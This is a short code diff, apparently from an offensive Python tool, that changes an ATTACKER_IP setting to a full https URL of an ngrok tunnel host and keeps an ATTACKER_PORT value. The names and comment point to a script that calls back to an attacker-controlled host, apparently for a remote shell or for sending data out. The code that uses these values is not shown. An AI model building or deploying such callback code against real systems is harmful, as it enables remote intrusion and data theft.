@@ -5,7 +5,7 @@ import subprocess
 import time
 import os
 
-ATTACKER_IP = 'heavily-cheerful-guinea.ngrok-free.app' # change this to the attacker's IP address
+ATTACKER_IP = 'https://heavily-cheerful-guinea.ngrok-free.app' # change this to the attacker's IP address
 ATTACKER_PORT = 8080 #this is not necessary anymore
 
 # Data is a dict
